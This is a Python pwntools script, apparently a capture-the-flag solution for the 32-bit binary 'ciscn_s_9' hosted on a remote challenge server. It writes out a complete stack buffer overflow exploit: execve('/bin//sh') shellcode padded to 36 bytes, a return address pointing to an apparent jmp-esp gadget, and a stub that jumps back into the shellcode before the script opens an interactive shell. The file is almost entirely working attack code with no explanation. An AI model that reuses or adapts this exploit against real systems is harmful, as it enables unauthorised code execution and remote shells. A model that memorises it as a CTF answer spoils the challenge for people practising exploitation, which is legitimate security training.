#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
context.arch = 'i386'
context.os = 'linux'
shellcode = '''
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xb
int 0x80
'''
shellcode = asm(shellcode)
# sh = process("./ciscn_s_9")
sh = remote("node3.buuoj.cn",27104)
elf = ELF("./ciscn_s_9")
payload = shellcode.ljust(36,'a') + p32(0x8048554)
payload +=asm("sub esp,40;call esp")
sh.sendline(payload)
sh.interactive()